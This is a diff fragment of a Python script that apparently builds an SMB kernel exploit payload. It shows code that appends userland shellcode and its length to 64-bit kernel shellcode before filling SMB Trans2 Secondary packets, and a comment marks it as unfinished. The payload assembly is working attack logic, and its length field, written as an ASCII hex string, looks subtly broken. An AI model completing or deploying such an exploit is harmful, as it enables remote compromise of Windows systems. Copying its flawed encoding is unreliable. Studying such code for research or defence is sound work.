@@ -211,15 +211,21 @@ if __name__ == "__main__":
         # read file into memory here
         # read_dll_file_as_hex()
 
-        # merge file with kernel shellcode to run payload
-        # kernel shellcode is for 64 bits at the moment
+        #kernel shellcode is for 64 bits at the moment
+        #create byte array of the kernel shellcode
         modified_kernel_shellcode = bytearray(kernel_shellcode)
 
-        # add PAYLOAD shellcode length after the kernel shellcode and write this value in hex
-        modified_kernel_shellcode += hex(len(userland_shellcode))
+        #add PAYLOAD shellcode length in bytes after the kernel shellcode and write this value
+        str_val = str(hex(len(userland_shellcode)))
+        my_str_as_bytes = str.encode(str_val)
+        bytesarray_append = bytearray(my_str_as_bytes)
+        modified_kernel_shellcode += bytesarray_append
 
-        # add the shellcode after the shellcode size
-        modified_kernel_shellcode += userland_shellcode
+        #convert userland shellcode to bytearray
+        payload_shellcode = bytearray(userland_shellcode)
+
+        #add the userland shellcode after the shellcode size
+        modified_kernel_shellcode += payload_shellcode
 
         # fill up the SMB Trans2 Secondary packet structures
         # CODE IS NOT FINISHED HERE
